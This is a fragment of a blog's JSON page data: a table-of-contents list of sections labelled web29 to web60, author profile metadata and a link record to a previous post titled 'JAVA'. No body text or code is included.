class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web29\"><span class=\"toc-text\">web29</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web30\"><span class=\"toc-text\">web30</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web31\"><span class=\"toc-text\">web31</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web32\"><span class=\"toc-text\">web32</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web33\"><span class=\"toc-text\">web33</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web34\"><span class=\"toc-text\">web34</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web35\"><span class=\"toc-text\">web35</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web36\"><span class=\"toc-text\">web36</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web37\"><span class=\"toc-text\">web37</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web38\"><span class=\"toc-text\">web38</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web39\"><span class=\"toc-text\">web39</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web40\"><span class=\"toc-text\">web40</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web41\"><span class=\"toc-text\">web41</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web42\"><span class=\"toc-text\">web42</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web43\"><span class=\"toc-text\">web43</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web44\"><span class=\"toc-text\">web44</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web45\"><span class=\"toc-text\">web45</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web46\"><span class=\"toc-text\">web46</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web47\"><span class=\"toc-text\">web47</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web48\"><span class=\"toc-text\">web48</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web49\"><span class=\"toc-text\">web49</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web50\"><span class=\"toc-text\">web50</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web51\"><span class=\"toc-text\">web51</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web52\"><span class=\"toc-text\">web52</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web53\"><span class=\"toc-text\">web53</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web54\"><span class=\"toc-text\">web54</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web55\"><span class=\"toc-text\">web55</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web56\"><span class=\"toc-text\">web56</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web57\"><span class=\"toc-text\">web57</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web58\"><span class=\"toc-text\">web58</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web59\"><span class=\"toc-text\">web59</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web60\"><span class=\"toc-text\">web60</span></a></li></ol></li></ol>","author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"JAVA","date":"2022-11-25T07:32:45.417Z","updated":"2022-11-21T12:44:39.276Z","comments":true,"path":"api/articles/JAVA.json","keywords":null,"cover":null,"text":"JAVA ","link":"","photos":[],"count_time":{"symbolsCount":5,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}